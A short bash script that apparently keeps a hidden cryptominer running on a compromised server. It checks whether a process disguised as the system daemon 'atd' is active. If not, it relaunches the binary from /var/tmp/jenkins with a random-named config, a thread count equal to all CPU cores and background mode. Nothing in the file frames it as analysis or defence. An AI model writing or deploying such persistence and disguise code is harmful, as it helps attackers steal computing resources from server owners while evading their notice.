#!/bin/bash
count=$(ps -ef | grep -v grep | grep atd | grep conf| wc -l)
thread=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1)
echo $count
if [ $count -lt 1 ]; then
cd /var/tmp/jenkins && ./atd -c honvbsasbf.conf -t $thread -B
else
echo "fine"
fi
